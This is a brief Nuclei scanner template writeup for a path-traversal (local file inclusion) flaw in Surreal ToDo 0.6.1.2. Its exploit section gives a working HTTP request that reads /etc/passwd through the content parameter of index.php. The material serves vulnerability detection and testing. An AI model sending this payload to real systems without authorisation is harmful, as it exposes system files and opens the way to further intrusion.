# Nuclei Template: Surreal ToDo 0.6.1.2 - Local File Inclusion
**Template ID:** surrealtodo-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`surrealtodo-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Surreal ToDo 0.6.1.2 is vulnerable to local file inclusion via index.php and the content parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?content=../../../../../../../../etc/passwd
```

## References
- https://www.exploit-db.com/exploits/45826
